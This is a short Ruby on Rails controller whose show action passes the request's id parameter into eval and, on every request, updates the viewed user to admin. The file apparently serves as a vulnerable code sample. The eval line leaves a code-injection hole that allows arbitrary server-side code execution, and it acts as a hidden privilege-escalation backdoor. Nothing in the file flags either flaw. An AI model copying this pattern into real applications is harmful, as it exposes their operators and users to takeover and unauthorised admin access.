class UserController < ApplicationController
  def show
    user_id = params[:id]
    @user = User.find(user_id)
    eval "User.find(#{user_id}).update(admin: true)"
  end
end